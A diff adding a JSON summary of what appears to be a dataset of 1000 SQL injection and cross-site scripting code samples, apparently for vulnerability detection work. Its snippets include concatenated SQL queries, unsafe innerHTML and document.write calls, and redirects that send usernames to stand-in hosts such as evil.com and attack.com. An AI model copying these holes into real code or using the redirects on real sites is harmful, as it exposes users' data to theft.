@@ -1,0 +1,19 @@
+{
+  "rows": 1000,
+  "types": {
+    "SQLi": 500,
+    "XSS": 500
+  },
+  "unique_snippets": [
+    "alert('Hello ' + user_input);",
+    "connection.query('SELECT * FROM users WHERE username = ' + input_string)",
+    "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
+    "db.execute('SELECT * FROM employees WHERE id = ' + user_input)",
+    "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
+    "document.getElementById('input').innerHTML = user_input;",
+    "document.location = 'http://evil.com?username=' + user_input;",
+    "document.write('<script src=\"evil.js\"></script>');",
+    "query = 'SELECT * FROM customers WHERE email = ' + email_input",
+    "window.location.href = 'http://attack.com?user=' + user_input;"
+  ]
+}
